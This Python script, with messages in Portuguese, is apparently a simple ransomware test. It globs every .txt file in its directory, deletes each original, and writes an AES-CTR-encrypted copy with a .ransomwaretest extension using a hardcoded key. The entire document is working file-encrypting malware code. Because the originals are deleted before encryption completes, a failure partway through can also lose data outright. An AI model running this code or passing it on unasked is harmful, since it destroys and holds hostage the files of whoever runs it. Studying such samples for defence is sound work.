import os
import pyaes
import glob

key = b'chavemuitosecreta'[:32].ljust(32, b'\0')

target_files_pattern = '*.txt'

target_files_list = glob.glob(target_files_pattern)

for target_file in target_files_list:
    try:
        with open(target_file, 'rb') as file:
            file_data = file.read()

        os.remove(target_file)

        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        output_file_name = target_file + '.ransomwaretest'
        with open(output_file_name, 'wb') as output_file:
            output_file.write(crypto_data)

    except Exception as e:
        print(f"Erro ao processar {target_file}: {e}")

print("Processo de encriptação concluído.")
